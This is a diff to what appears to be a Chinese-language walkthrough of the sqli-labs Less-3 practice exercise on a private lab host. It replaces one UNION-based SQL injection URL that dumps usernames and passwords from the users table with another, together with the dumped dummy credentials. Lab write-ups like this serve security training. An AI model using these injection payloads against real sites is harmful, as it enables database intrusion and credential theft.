@@ -34,7 +34,5 @@ url：http://10.0.2.15/sqli/Less-3/?id=0') UNION SELECT 1,group_concat(column_na
 推测username表示用户名，password表示密码
 
 5.字段值
-url：http://10.0.2.15/sqli/Less-3/?id=0') UNION SELECT 1,group_concat(username),group_concat(password) from users--+
-Your Login name:Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4
-Your Password:Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4
-
+http://10.0.2.15/sqli/Less-3/?id=0') UNION SELECT 1,group_concat(username,0x3a,password),3 from users--+
+Dumb:Dumb,Angelina:I-kill-you,Dummy:p@ssword,secure:crappy,stupid:stupidity,superman:genious,batman:mob!le,admin:admin,admin1:admin1,admin2:admin2,admin3:admin3,dhakkan:dumbo,admin4:admin4
